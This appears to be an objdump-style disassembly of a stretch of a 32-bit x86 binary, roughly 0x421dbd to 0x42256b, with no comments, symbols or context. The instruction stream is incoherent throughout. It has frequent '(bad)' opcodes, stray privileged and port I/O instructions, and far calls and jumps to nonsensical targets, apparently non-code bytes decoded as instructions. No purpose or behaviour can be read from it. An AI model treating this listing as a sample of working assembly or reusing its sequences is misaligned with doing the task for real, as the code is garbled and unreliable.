  421dbd:	sbb    ecx,DWORD PTR [ebp+edx*4+0x45bf632c]
  421dc4:	call   0x338d560e
  421dc9:	cli    
  421dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dcb:	or     bl,0x2d
  421dce:	sbb    eax,DWORD PTR [edi]
  421dd0:	xor    DWORD PTR [edx+0x1ef82543],eax
  421dd6:	mov    bh,0x38
  421dd8:	mov    bh,0x54
  421dda:	mov    ecx,0x225cf8a2
  421ddf:	xor    ebx,ecx
  421de1:	mov    esp,0x7580280c
  421de6:	sar    dh,cl
  421de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421de9:	lods   eax,DWORD PTR ds:[esi]
  421dea:	jecxz  0x421d6e
  421dec:	jno    0x421de1
  421dee:	dec    eax
  421def:	sbb    al,0xb1
  421df1:	push   edi
  421df2:	test   BYTE PTR [edi+0x52],al
  421df5:	je     0x421dd6
  421df7:	mov    edi,0xa21e7fa2
  421dfc:	jge    0x421df9
  421dfe:	jnp    0x421e0d
  421e00:	jg     0x421d8b
  421e02:	std    
  421e03:	fucomip st,st(6)
  421e05:	sub    eax,0xca00183d
  421e0a:	mov    eax,0x89041142
  421e0f:	inc    ecx
  421e10:	inc    ebp
  421e11:	pop    ebx
  421e12:	enter  0xe480,0x32
  421e16:	daa    
  421e17:	ror    dl,cl
  421e19:	sar    dh,1
  421e1b:	stos   BYTE PTR es:[edi],al
  421e1c:	pop    ebp
  421e1d:	fisub  WORD PTR [esi-0x6d]
  421e20:	ret    
  421e21:	aas    
  421e22:	jno    0x421e55
  421e24:	and    al,bh
  421e26:	inc    ebp
  421e27:	enter  0xa59d,0x69
  421e2b:	xlat   BYTE PTR ds:[ebx]
  421e2c:	lods   eax,DWORD PTR ds:[esi]
  421e2d:	xlat   BYTE PTR ds:[ebx]
  421e2e:	adc    edx,DWORD PTR [esi-0x4d]
  421e31:	jg     0x421e9c
  421e33:	clc    
  421e34:	xor    esp,DWORD PTR [edi]
  421e36:	push   esp
  421e37:	(bad)  
  421e38:	into   
  421e39:	cdq    
  421e3a:	repz push cs
  421e3c:	aas    
  421e3d:	jle    0x421e03
  421e3f:	out    0xc6,al
  421e41:	jbe    0x421e83
  421e43:	out    dx,eax
  421e44:	xchg   DWORD PTR [ecx+edi*4],ecx
  421e47:	nop
  421e48:	xchg   edx,eax
  421e49:	sbb    ebx,edi
  421e4b:	fs popf 
  421e4d:	ss mov al,0x73
  421e50:	into   
  421e51:	push   eax
  421e52:	call   0x7329:0xf4167fee
  421e59:	pop    edi
  421e5a:	mov    esi,0x23d41c8
  421e5f:	cmp    ebx,edi
  421e61:	ficom  DWORD PTR [edx+0x2a895f6c]
  421e67:	xchg   esp,eax
  421e68:	xor    al,0x1e
  421e6a:	bound  esp,QWORD PTR [edx]
  421e6c:	inc    ecx
  421e6d:	mov    ebp,0xea0cbab3
  421e72:	jno    0x421ec1
  421e74:	cdq    
  421e75:	test   eax,0xe45c0a19
  421e7a:	imul   esp,DWORD PTR fs:[edi+0x7b],0x38
  421e7f:	xchg   esi,eax
  421e80:	adc    al,0x85
  421e82:	shl    ah,0x9c
  421e85:	addr16 inc ecx
  421e87:	jns    0x421eeb
  421e89:	sub    eax,0x44af3fc1
  421e8e:	push   esi
  421e8f:	mov    bh,0x0
  421e91:	dec    ebp
  421e92:	jno    0x421e33
  421e94:	lds    esp,FWORD PTR [edi]
  421e96:	mov    bl,0x99
  421e98:	test   DWORD PTR [eax+0x19],edx
  421e9b:	mov    esp,0xa6e33ca0
  421ea0:	int3   
  421ea1:	add    ecx,esi
  421ea3:	icebp  
  421ea4:	iret   
  421ea5:	add    al,0x50
  421ea7:	inc    edx
  421ea8:	lea    esp,[ebx]
  421eaa:	nop
  421eab:	xchg   esp,eax
  421eac:	out    dx,al
  421ead:	out    dx,al
  421eae:	dec    edx
  421eaf:	push   esi
  421eb0:	repnz es shr esi,0x83
  421eb5:	pop    esi
  421eb6:	adc    DWORD PTR [esi+eiz*2+0x55],0xe8f6db97
  421ebe:	outs   dx,BYTE PTR ds:[esi]
  421ebf:	or     DWORD PTR [edx+eax*4-0xb],eax
  421ec3:	lock (bad) 
  421ec5:	xchg   esi,eax
  421ec6:	cmp    DWORD PTR [ebp-0x4f9d36dc],ecx
  421ecc:	bound  ebp,QWORD PTR [ecx]
  421ece:	pop    esi
  421ecf:	or     al,0xf4
  421ed1:	inc    eax
  421ed2:	cmp    edx,DWORD PTR [eax]
  421ed4:	cwde   
  421ed5:	test   al,0xac
  421ed7:	mov    fs,WORD PTR [edi-0x1c]
  421eda:	add    al,0x65
  421edc:	add    BYTE PTR [ecx+0x7448ded7],ah
  421ee2:	dec    eax
  421ee3:	adc    BYTE PTR [esi+0x2e],al
  421ee6:	ds out 0xa9,eax
  421ee9:	(bad)  
  421eeb:	repz in al,dx
  421eed:	jmp    0x18a3:0x99dfd02e
  421ef4:	pusha  
  421ef5:	lahf   
  421ef6:	out    0xad,eax
  421ef8:	adc    dl,BYTE PTR [edx]
  421efa:	(bad)  
  421efb:	fidiv  WORD PTR [ebx+0x62]
  421efe:	popf   
  421eff:	lea    ebx,[ecx]
  421f01:	lods   al,BYTE PTR ds:[esi]
  421f02:	add    esi,DWORD PTR [edx]
  421f04:	rcr    dh,0x57
  421f07:	in     eax,0xcf
  421f09:	mov    bh,0x1a
  421f0b:	adc    al,0x1f
  421f0d:	push   ebp
  421f0e:	jbe    0x421ea6
  421f10:	lock dec esp
  421f12:	dec    eax
  421f13:	mov    esp,0x6a3336ee
  421f18:	jmp    0x421ee3
  421f1a:	jp     0x421f62
  421f1c:	in     eax,dx
  421f1d:	outs   dx,BYTE PTR ds:[esi]
  421f1e:	popa   
  421f1f:	pop    eax
  421f20:	mov    ds:0x4fb253e3,al
  421f25:	cli    
  421f26:	and    ecx,DWORD PTR gs:[edx+0x45]
  421f2a:	or     BYTE PTR [ebx],ah
  421f2c:	mov    ch,0x7
  421f2e:	ja     0x421ec4
  421f30:	dec    eax
  421f31:	rcl    BYTE PTR [eax+0xdb3fdb2],cl
  421f37:	std    
  421f38:	fdiv   DWORD PTR [edi+0x56a566d4]
  421f3e:	in     al,0x3f
  421f40:	push   edx
  421f41:	add    DWORD PTR ds:0x8492a851,ebp
  421f47:	push   0xb0ba034f
  421f4c:	cwde   
  421f4d:	iret   
  421f4e:	outs   dx,DWORD PTR ds:[esi]
  421f4f:	push   0x9178a297
  421f54:	inc    esp
  421f55:	scas   al,BYTE PTR es:[edi]
  421f56:	push   ecx
  421f57:	lea    edi,[edx+eiz*2]
  421f5a:	mov    edi,0x579ad18d
  421f5f:	call   0xffbbdb58
  421f64:	into   
  421f65:	pop    ss
  421f66:	push   edx
  421f67:	cld    
  421f68:	jae    0x421fd1
  421f6a:	into   
  421f6b:	int    0x26
  421f6d:	fcomp  DWORD PTR [esi+0x7cece89d]
  421f73:	fnstcw WORD PTR [edx]
  421f75:	in     eax,dx
  421f76:	ins    BYTE PTR es:[edi],dx
  421f77:	sar    DWORD PTR [ebp+0x6],cl
  421f7a:	push   ecx
  421f7b:	fs add eax,0x12e5522c
  421f81:	popa   
  421f82:	mov    dl,0x83
  421f84:	mov    ch,0xf8
  421f86:	sti    
  421f87:	ret    
  421f88:	hlt    
  421f89:	xchg   esi,eax
  421f8a:	sbb    DWORD PTR [esi],ebp
  421f8c:	pop    esi
  421f8d:	jb     0x422006
  421f8f:	xor    BYTE PTR [esi+0x571a62d4],0xd3
  421f96:	test   edi,0x18640ae
  421f9c:	retf   
  421f9d:	daa    
  421f9e:	scas   eax,DWORD PTR es:[edi]
  421f9f:	arpl   WORD PTR ds:0x7f156c58,cx
  421fa5:	clc    
  421fa6:	inc    ebp
  421fa7:	lods   eax,DWORD PTR fs:[esi]
  421fa9:	jbe    0x421f2c
  421fab:	mov    ds:0x178e8db4,eax
  421fb0:	dec    esp
  421fb1:	imul   esi,eax,0xc60563b8
  421fb7:	jecxz  0x421faf
  421fb9:	sub    edi,edx
  421fbb:	mov    eax,0xb6b8d657
  421fc0:	retf   
  421fc1:	pop    esi
  421fc2:	pop    edx
  421fc3:	outs   dx,BYTE PTR ds:[esi]
  421fc4:	in     al,0x48
  421fc6:	push   edi
  421fc7:	mov    ebp,0xd61cbd0d
  421fcc:	call   FWORD PTR [ebx-0x2c6bcbe8]
  421fd2:	test   eax,0x56cccdc7
  421fd7:	sub    al,0x95
  421fd9:	fwait
  421fda:	push   esp
  421fdb:	gs int3 
  421fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fde:	int    0xfe
  421fe0:	sbb    ebp,ecx
  421fe2:	mov    edx,0xb1e69004
  421fe7:	dec    ecx
  421fe8:	js     0x42200c
  421fea:	outs   dx,BYTE PTR ds:[esi]
  421feb:	jge    0x421f85
  421fed:	pop    edi
  421fee:	jecxz  0x421fc5
  421ff0:	test   BYTE PTR [ecx-0x71],cl
  421ff3:	mov    edx,0x14c620da
  421ff9:	jecxz  0x421fa9
  421ffb:	in     eax,0xd6
  421ffd:	test   al,0xd5
  421fff:	add    esp,DWORD PTR [eax-0x755789d9]
  422005:	mov    ebx,0x1e705cc8
  42200a:	repnz loope 0x421fe8
  42200d:	pop    es
  42200e:	and    al,0x7a
  422010:	xchg   ecx,eax
  422011:	inc    ebx
  422012:	mov    DWORD PTR [eax],ebp
  422014:	jecxz  0x422080
  422016:	xor    cl,bh
  422018:	repnz in al,dx
  42201a:	sbb    DWORD PTR [eax+0x41ec5221],ebp
  422020:	call   0xd66b8e18
  422025:	xor    dh,dl
  422027:	jle    0x42203c
  422029:	adc    edx,eax
  42202b:	loop   0x422096
  42202d:	push   ebp
  42202e:	nop
  42202f:	lods   al,BYTE PTR ds:[esi]
  422030:	inc    esi
  422031:	sti    
  422032:	push   ds
  422033:	sti    
  422034:	fimul  WORD PTR [edx]
  422036:	mov    ah,0x83
  422038:	jo     0x42205a
  42203a:	dec    edx
  42203b:	frstor [edx-0x1ccc4962]
  422041:	dec    edi
  422042:	(bad)  
  422043:	cmp    eax,0xe9446441
  422048:	int    0xec
  42204a:	jns    0x422004
  42204c:	out    0xc1,eax
  42204e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42204f:	mov    al,ds:0xfb821b50
  422054:	enter  0x9e9f,0x3b
  422058:	inc    edi
  422059:	das    
  42205a:	mov    eax,0x25ed3b5
  42205f:	push   0x56e3e798
  422064:	cmp    al,0x76
  422066:	sbb    bh,BYTE PTR [eax+0x45b5930d]
  42206c:	dec    ebp
  42206d:	cmp    eax,0xc9b2c490
  422072:	inc    edx
  422073:	jne    0x422002
  422075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422076:	and    ch,dl
  422078:	fisub  WORD PTR [edx+0x6]
  42207b:	lock ror BYTE PTR [ebx],1
  42207e:	or     BYTE PTR [esi+0x2ca94f55],dh
  422084:	add    BYTE PTR [esi],dh
  422086:	mov    cl,0x9e
  422088:	popf   
  422089:	mov    al,0x6c
  42208b:	or     eax,esi
  42208d:	sbb    ebx,DWORD PTR [edx]
  42208f:	mov    ecx,cs
  422091:	cldemote BYTE PTR [edi+eax*1-0x7cd7dec4]
  422099:	dec    ebx
  42209a:	dec    ebx
  42209b:	pop    esi
  42209c:	ja     0x4220ee
  42209e:	jo     0x422052
  4220a0:	shl    BYTE PTR [ebp+0x4c29de11],cl
  4220a6:	sub    BYTE PTR ds:0xc5f7181b,0x89
  4220ad:	imul   ebp,DWORD PTR [ecx],0xb100c9e7
  4220b3:	jb     0x422045
  4220b5:	mov    esi,0x33b54a99
  4220ba:	pusha  
  4220bb:	jno    0x42211f
  4220bd:	and    DWORD PTR [eax+0x6a],edi
  4220c0:	push   es
  4220c1:	out    0x44,al
  4220c3:	out    0x28,al
  4220c5:	adc    DWORD PTR [eax],ebx
  4220c7:	sbb    ch,cl
  4220c9:	push   ds
  4220ca:	pop    es
  4220cb:	sbb    edi,ebx
  4220cd:	cmp    BYTE PTR [ebp+0x2e4a5b28],dl
  4220d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220d4:	sub    BYTE PTR [edi],dh
  4220d6:	xor    bl,BYTE PTR [ecx]
  4220d8:	mov    ah,0xb3
  4220da:	es shr DWORD PTR ds:[esi-0x23],cl
  4220df:	sti    
  4220e0:	test   ah,0xa5
  4220e3:	(bad)  
  4220e4:	cld    
  4220e5:	push   edi
  4220e6:	jae    0x4220b0
  4220e8:	push   cs
  4220e9:	xchg   ecx,eax
  4220ea:	lahf   
  4220eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220ec:	js     0x4220a9
  4220ee:	add    DWORD PTR [edi-0x6e7bcd03],esp
  4220f4:	pop    eax
  4220f5:	daa    
  4220f6:	sub    BYTE PTR [ecx-0x5f3d7212],bl
  4220fc:	ds sub al,0x63
  4220ff:	test   al,0xfe
  422101:	call   0x2cd464d2
  422106:	sub    eax,0x7c32dd3
  42210b:	test   al,0x1d
  42210d:	repz jno 0x42216b
  422110:	or     ebx,DWORD PTR [eax-0x56]
  422113:	or     eax,0x7152a920
  422118:	aas    
  422119:	mov    esi,0x87495044
  42211e:	xchg   esp,eax
  42211f:	xor    edi,esi
  422121:	scas   eax,DWORD PTR es:[edi]
  422122:	cmp    edi,eax
  422124:	in     eax,0x73
  422126:	mov    ebx,0x5cd0567e
  42212b:	jno    0x422144
  42212d:	ins    BYTE PTR es:[edi],dx
  42212e:	jbe    0x422160
  422130:	pop    ds
  422131:	adc    al,0xa8
  422133:	pop    edi
  422134:	rcr    BYTE PTR [ecx],cl
  422136:	or     al,0x33
  422138:	nop
  422139:	daa    
  42213a:	(bad)  
  42213b:	mov    ecx,edi
  42213d:	retf   0x7c07
  422140:	and    cl,BYTE PTR [edx+0x79]
  422143:	jne    0x4220fa
  422145:	push   DWORD PTR ds:0xa38b622d
  42214b:	clc    
  42214c:	aad    0x7c
  42214e:	dec    ebx
  42214f:	adc    eax,0x979bef17
  422154:	pop    ds
  422155:	xchg   edi,eax
  422156:	lods   eax,DWORD PTR ds:[esi]
  422158:	aas    
  422159:	xchg   DWORD PTR [edx-0x18],edi
  42215c:	jne    0x422116
  42215e:	shl    BYTE PTR [ecx],cl
  422160:	ss ret 
  422162:	test   al,0x30
  422164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422165:	sbb    ecx,DWORD PTR [eax]
  422167:	push   0xffffffea
  422169:	push   edx
  42216a:	icebp  
  42216b:	xor    al,0xa3
  42216d:	jo     0x422162
  42216f:	lds    eax,FWORD PTR [edx]
  422171:	sbb    ebx,DWORD PTR ds:0x22a24cd7
  422177:	(bad)  
  422178:	stc    
  422179:	mov    bh,bh
  42217b:	in     al,dx
  42217c:	mov    al,0xeb
  42217e:	jge    0x4221c7
  422180:	xor    ch,BYTE PTR [edi]
  422182:	sbb    dh,BYTE PTR [ebx-0xf]
  422185:	inc    esi
  422186:	adc    BYTE PTR [edi-0x41],dl
  422189:	sub    al,0xc0
  42218b:	retf   
  42218c:	test   eax,0xebaade50
  422191:	mov    al,0xde
  422193:	rol    edi,0x79
  422196:	stos   BYTE PTR es:[edi],al
  422197:	jo     0x4221b6
  422199:	push   0x31
  42219b:	cmps   WORD PTR cs:[esi],WORD PTR es:[edi]
  42219e:	push   ebx
  42219f:	jbe    0x422167
  4221a1:	or     DWORD PTR [ebx-0x8],edx
  4221a4:	mov    ax,ds:0x8f5fe279
  4221aa:	mov    eax,0x3ee658dd
  4221af:	xchg   bh,dh
  4221b1:	fwait
  4221b2:	ja     0x422145
  4221b4:	push   ds
  4221b5:	test   al,0xff
  4221b7:	or     al,0x8
  4221b9:	and    BYTE PTR [eax],bl
  4221bb:	shr    esi,0xd6
  4221be:	nop
  4221bf:	dec    ebp
  4221c0:	pop    ss
  4221c1:	daa    
  4221c2:	(bad)  
  4221c3:	jae    0x4221b7
  4221c5:	imul   bl
  4221c7:	sub    al,0x2c
  4221c9:	dec    ebp
  4221ca:	or     al,0xfb
  4221cc:	and    eax,0xab47d6af
  4221d1:	into   
  4221d2:	jnp    0x4221a9
  4221d4:	(bad)  
  4221d5:	pop    ebx
  4221d6:	push   0xa2d461cb
  4221db:	or     bh,BYTE PTR [eax]
  4221dd:	add    eax,DWORD PTR [edx+0x3c]
  4221e0:	jle    0x422254
  4221e2:	cmp    dl,BYTE PTR [ecx-0x5c]
  4221e5:	dec    edi
  4221e6:	loope  0x422253
  4221e8:	jp     0x4221fd
  4221ea:	repz inc ebx
  4221ec:	push   ebp
  4221ed:	dec    esp
  4221ee:	pop    ebx
  4221ef:	sub    eax,0x6e8e1f6e
  4221f4:	popa   
  4221f5:	jb     0x422181
  4221f7:	sbb    al,0x95
  4221f9:	inc    edi
  4221fa:	aaa    
  4221fb:	fbstp  TBYTE PTR [ecx]
  4221fd:	scas   eax,DWORD PTR es:[edi]
  4221fe:	add    al,0x1b
  422200:	or     ah,dh
  422202:	(bad)  
  422203:	and    eax,0x5373cbef
  422208:	outs   dx,DWORD PTR ds:[esi]
  422209:	adc    eax,0x6de84dd3
  42220e:	mov    dh,0x71
  422210:	jle    0x42225e
  422212:	ss aam 0x29
  422215:	pop    ecx
  422216:	lock adc eax,0x47e7116a
  42221c:	call   edi
  42221e:	leave  
  42221f:	ficom  WORD PTR [edx-0x869afb4]
  422225:	in     eax,0xce
  422227:	adc    DWORD PTR [ebx+0x796275fe],ebp
  42222d:	mov    dl,0xa4
  42222f:	xchg   edx,eax
  422230:	ret    0xe77a
  422233:	mov    bl,0x26
  422235:	add    al,0xdc
  422237:	push   esi
  422238:	add    DWORD PTR [ecx+0x25],esi
  42223b:	icebp  
  42223c:	shl    ecx,1
  42223e:	repnz fnstsw WORD PTR [edi+0x2]
  422242:	cmp    eax,0xfed05023
  422247:	dec    ebp
  422248:	xchg   ebx,eax
  422249:	loop   0x4222b6
  42224b:	mov    DWORD PTR [edi-0x33],edx
  42224e:	xchg   cl,ch
  422250:	push   cs
  422251:	add    cl,al
  422253:	fstp   TBYTE PTR [ebx+0xf0400e8]
  422259:	pop    es
  42225a:	push   0x4b626f21
  42225f:	jae    0x422282
  422261:	ins    DWORD PTR es:[edi],dx
  422262:	push   0x7e674a9f
  422267:	addr16 cmp dh,dh
  42226a:	ror    DWORD PTR [ebx+0x77b2eab2],cl
  422270:	neg    DWORD PTR [esp+esi*8-0x30099f17]
  422277:	clc    
  422278:	add    ebx,DWORD PTR [esi-0x1363de8c]
  42227e:	dec    eax
  42227f:	std    
  422280:	jp     0x4222dc
  422282:	iret   
  422283:	add    cl,al
  422285:	aas    
  422286:	(bad)  
  422287:	js     0x4222fd
  422289:	lods   eax,DWORD PTR ds:[esi]
  42228a:	jmp    0xee18:0x629aad31
  422291:	ficomp WORD PTR [edx+ebp*4]
  422294:	xor    BYTE PTR [ebx+edi*4+0x6867c3b8],0x74
  42229c:	and    al,0xfa
  42229e:	pop    esi
  42229f:	pop    ss
  4222a0:	test   al,0x87
  4222a2:	xchg   DWORD PTR [ebp-0x3941a46b],ebp
  4222a8:	inc    ebx
  4222a9:	sbb    di,WORD PTR [ebx-0x53769d68]
  4222b0:	shr    BYTE PTR fs:[esi-0x54],1
  4222b4:	pop    es
  4222b5:	ficomp WORD PTR [eax-0x4446bbea]
  4222bb:	fcomp  DWORD PTR [edx]
  4222bd:	add    bh,0x7d
  4222c0:	push   esi
  4222c1:	jg     0x4222ee
  4222c3:	out    0xec,al
  4222c5:	je     0x422275
  4222c7:	mov    eax,0x1ed5a651
  4222cc:	mov    eax,ds:0x255c89a2
  4222d1:	iret   
  4222d2:	push   es
  4222d3:	jmp    FWORD PTR [edi]
  4222d5:	sub    bl,bl
  4222d7:	sbb    eax,0xb9455e56
  4222dc:	std    
  4222dd:	vaddsubps xmm4,xmm4,XMMWORD PTR [ecx+edx*2-0x33]
  4222e3:	mov    gs,WORD PTR [esi-0x54cb6ba5]
  4222e9:	and    edx,DWORD PTR [esi+eax*4+0x65]
  4222ed:	ins    DWORD PTR es:[edi],dx
  4222ee:	fistp  DWORD PTR [edx+0x5]
  4222f1:	sub    esi,esi
  4222f3:	cmp    eax,0x37a2527e
  4222f8:	pop    ss
  4222f9:	xchg   DWORD PTR [ecx+esi*8-0x7cc48bd],eax
  422300:	xchg   edx,eax
  422301:	retf   
  422302:	imul   DWORD PTR [esi-0x70]
  422305:	lods   eax,DWORD PTR ds:[esi]
  422306:	mov    BYTE PTR [ebp-0x16f55d86],ch
  42230c:	and    DWORD PTR [esi+0x3149deb6],esi
  422312:	fcomp  DWORD PTR ds:0xfc28f07
  422318:	rep stos BYTE PTR es:[edi],al
  42231a:	xor    al,0xb4
  42231c:	lock out dx,eax
  42231e:	mov    edx,0x4e4ad581
  422323:	out    0xb5,eax
  422325:	repnz (bad) 
  422327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422328:	xlat   BYTE PTR ds:[ebx]
  422329:	mov    edx,ebp
  42232b:	sbb    DWORD PTR [ebx+0x4344741b],0xfffffff0
  422332:	xchg   esi,eax
  422333:	sub    BYTE PTR [esi],ch
  422335:	cmp    DWORD PTR [ebx+0x17],esi
  422338:	in     eax,0x66
  42233a:	in     eax,dx
  42233b:	fld    QWORD PTR ds:0x92df59cb
  422341:	sbb    DWORD PTR [edx+ecx*2+0x732f275f],ebx
  422348:	add    eax,eax
  42234a:	pop    ss
  42234b:	inc    edx
  42234c:	(bad)  
  42234e:	lds    ecx,FWORD PTR [ebx+0x2aa843ef]
  422354:	adc    al,0xeb
  422356:	inc    edi
  422357:	mov    ah,0xd3
  422359:	imul   DWORD PTR [eax+0x7a]
  42235c:	stos   DWORD PTR es:[edi],eax
  42235d:	stos   DWORD PTR es:[edi],eax
  42235e:	xchg   edx,ecx
  422360:	inc    edi
  422361:	mov    bl,0x33
  422363:	fwait
  422364:	jecxz  0x4223b5
  422366:	mov    eax,0xc9d784a4
  42236b:	test   eax,0xd768e3cd
  422370:	mov    ebp,0xebda2b12
  422375:	out    0x35,al
  422377:	out    0xff,al
  422379:	repnz mov edi,0x812112e3
  42237f:	sti    
  422380:	dec    esp
  422381:	jne    0x4223c2
  422383:	cs sbb ah,ch
  422386:	jle    0x42236b
  422388:	mov    ebx,0xe7f46c08
  42238d:	jb     0x42240c
  42238f:	mov    ebx,db1
  422392:	xchg   ebx,eax
  422393:	pop    ebp
  422394:	call   0x53b2:0xdcb316c9
  42239b:	daa    
  42239c:	sbb    al,0x22
  42239e:	adc    esp,DWORD PTR [ebx]
  4223a0:	or     bl,BYTE PTR [eax-0x21b9699a]
  4223a6:	push   esp
  4223a7:	loop   0x422364
  4223a9:	test   DWORD PTR [esi+0x7da61c63],edx
  4223af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223b0:	cld    
  4223b1:	jno    0x42237b
  4223b3:	lods   eax,DWORD PTR ds:[esi]
  4223b4:	mov    al,ds:0xd48a206f
  4223b9:	sbb    edx,0x14871477
  4223bf:	mov    DWORD PTR [ebx+0x6c8aad14],ecx
  4223c5:	sbb    esi,DWORD PTR [esi+edx*4+0x559090af]
  4223cc:	xchg   ebp,eax
  4223cd:	mov    ds:0x68ee3116,eax
  4223d2:	or     al,0x36
  4223d4:	jp     0x42237d
  4223d6:	or     eax,0xeb077fea
  4223db:	iret   
  4223dc:	mov    eax,0x9e135cac
  4223e1:	sub    al,0xaf
  4223e3:	repz in al,0xbd
  4223e6:	sbb    eax,0xb835427d
  4223eb:	jb     0x4223b4
  4223ed:	adc    DWORD PTR [ecx],ecx
  4223ef:	bound  esi,QWORD PTR [ebx+eax*8]
  4223f2:	xchg   edi,eax
  4223f3:	nop
  4223f4:	mov    cl,0x10
  4223f6:	scas   eax,DWORD PTR es:[edi]
  4223f7:	aas    
  4223f8:	mov    cl,0xa1
  4223fa:	mov    eax,ss
  4223fc:	dec    ebp
  4223fd:	jmp    0xd0a1c230
  422402:	pop    esi
  422403:	inc    bp
  422405:	jns    0x422427
  422407:	cld    
  422408:	dec    ecx
  422409:	push   esp
  42240a:	push   0xffffffd8
  42240c:	retf   0xa1d9
  42240f:	or     DWORD PTR [edx-0x55],ebp
  422412:	test   DWORD PTR [esi-0x52],0x4ae6301f
  422419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42241a:	mov    edi,esp
  42241c:	aas    
  42241d:	xlat   BYTE PTR ds:[ebx]
  42241e:	mov    bh,0x79
  422420:	jae    0x4223f9
  422422:	ins    BYTE PTR es:[edi],dx
  422423:	pop    eax
  422424:	add    bl,BYTE PTR [ecx+eiz*1+0x43]
  422428:	leave  
  422429:	retf   
  42242a:	(bad)  
  42242b:	jge    0x4223f0
  42242d:	xlat   BYTE PTR ds:[ebx]
  42242e:	dec    edx
  42242f:	and    al,0x10
  422431:	or     al,0x81
  422433:	pop    ds
  422434:	shr    DWORD PTR [ebx+0x267ec15e],1
  42243a:	cmp    al,0xfd
  42243c:	retf   
  42243d:	fst    QWORD PTR [ebx-0x21649097]
  422443:	stos   BYTE PTR es:[edi],al
  422444:	xchg   ebx,eax
  422445:	jno    0x4223ed
  422447:	add    DWORD PTR [ecx+0x2a],esp
  42244a:	mov    ch,BYTE PTR [ebx]
  42244c:	loopne 0x42247e
  42244e:	ds mov eax,0x10514dc9
  422454:	out    0x82,al
  422456:	daa    
  422457:	cs cld 
  422459:	inc    ebp
  42245a:	xchg   ebx,eax
  42245b:	sbb    eax,0x7aa9e04b
  422460:	add    eax,0x2decc540
  422465:	(bad)
  422468:	inc    ebx
  422469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42246a:	outs   dx,BYTE PTR ds:[esi]
  42246b:	outs   dx,DWORD PTR ds:[esi]
  42246c:	pop    ss
  42246d:	cld    
  42246e:	idiv   BYTE PTR ds:0xb005a465
  422474:	or     DWORD PTR [edi-0xc],edi
  422477:	jb     0x4223fe
  422479:	(bad)  
  42247a:	push   esi
  42247b:	call   0x4b28:0x70f97333
  422482:	test   al,bl
  422484:	adc    DWORD PTR [edi-0x759c8655],ecx
  42248a:	xchg   DWORD PTR [edx],ecx
  42248c:	sub    DWORD PTR [edi-0x6c],ebx
  42248f:	fwait
  422490:	mov    ah,0x17
  422492:	je     0x422429
  422494:	sbb    DWORD PTR [esi+0x10],ecx
  422497:	push   ecx
  422498:	(bad)  
  422499:	dec    ebx
  42249a:	mov    ebp,DWORD PTR [edi]
  42249c:	shl    BYTE PTR [esi],1
  42249e:	mov    dl,0xc8
  4224a0:	clc    
  4224a1:	dec    ebx
  4224a2:	adc    BYTE PTR [ebp-0x5a510d2a],bh
  4224a8:	inc    edi
  4224a9:	xchg   BYTE PTR [eax-0x40],bl
  4224ac:	mov    DWORD PTR [ebx+ebp*4+0x22],esp
  4224b0:	inc    esi
  4224b1:	jnp    0x422481
  4224b3:	xchg   ebp,eax
  4224b4:	xor    ah,BYTE PTR [esi-0x660d5f]
  4224ba:	and    eax,0x4a00bdeb
  4224bf:	mov    edi,0x7255fb47
  4224c4:	in     eax,0xd4
  4224c6:	mov    al,0xed
  4224c8:	ins    BYTE PTR es:[edi],dx
  4224c9:	inc    eax
  4224ca:	div    BYTE PTR [esi-0x136560d]
  4224d0:	xor    al,0x58
  4224d2:	xchg   edx,eax
  4224d3:	or     al,0xb1
  4224d5:	cmc    
  4224d6:	mov    bh,0xb7
  4224d8:	inc    edx
  4224d9:	inc    esi
  4224da:	imul   eax,eax,0x58
  4224dd:	sti    
  4224de:	daa    
  4224df:	loope  0x4224a2
  4224e1:	aad    0xb1
  4224e3:	pop    ds
  4224e4:	out    dx,eax
  4224e5:	xor    esp,eax
  4224e7:	xchg   ebx,eax
  4224e8:	bnd js 0x42254c
  4224eb:	xchg   esi,eax
  4224ec:	stc    
  4224ed:	dec    eax
  4224ee:	cwde   
  4224ef:	jge    0x4224a3
  4224f1:	pushf  
  4224f2:	add    DWORD PTR [eax+0x5b],esp
  4224f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224f6:	and    al,0xe1
  4224f8:	push   eax
  4224f9:	aaa    
  4224fa:	gs or  al,0x41
  4224fd:	push   eax
  4224fe:	dec    esp
  4224ff:	sub    eax,0x1a955f81
  422504:	iret   
  422505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422506:	xor    BYTE PTR [ebx+0x42ac4163],ah
  42250c:	in     eax,dx
  42250d:	cmp    eax,0xddae2295
  422512:	loop   0x4224b0
  422514:	daa    
  422515:	cli    
  422516:	mov    dl,0x35
  422518:	or     bl,BYTE PTR ds:0xae296ebe
  42251e:	or     al,0x78
  422520:	leave  
  422521:	hlt    
  422522:	adc    al,0xbd
  422524:	imul   ecx,ecx,0x45ad67d0
  42252a:	push   edx
  42252b:	mov    ds:0xf69ece91,eax
  422530:	dec    dx
  422532:	add    DWORD PTR [edi+0x10],ebx
  422535:	pop    ecx
  422536:	adc    bh,ah
  422538:	pop    eax
  422539:	add    BYTE PTR [ebp+0x18],bh
  42253c:	pusha  
  42253d:	inc    edi
  42253e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42253f:	call   FWORD PTR [eax+0x2c]
  422542:	loope  0x422565
  422544:	inc    edx
  422545:	add    BYTE PTR [edi],0x8f
  422548:	mov    ds:0xc64cbced,eax
  42254d:	push   0xffffffca
  42254f:	add    al,dl
  422551:	test   al,0x6f
  422553:	inc    esi
  422554:	push   esp
  422555:	mov    bh,0x27
  422557:	pop    ebx
  422558:	vpcmpeqw ymm2,ymm5,YMMWORD PTR [ecx+0x914b91f]
  422560:	mov    edx,0x2eb076b9
  422565:	popf   
  422566:	push   esi
  422567:	sub    BYTE PTR [edx-0x10],0x7e
  42256b:	les    esp,FWORD PTR [edx-0x297eabba]
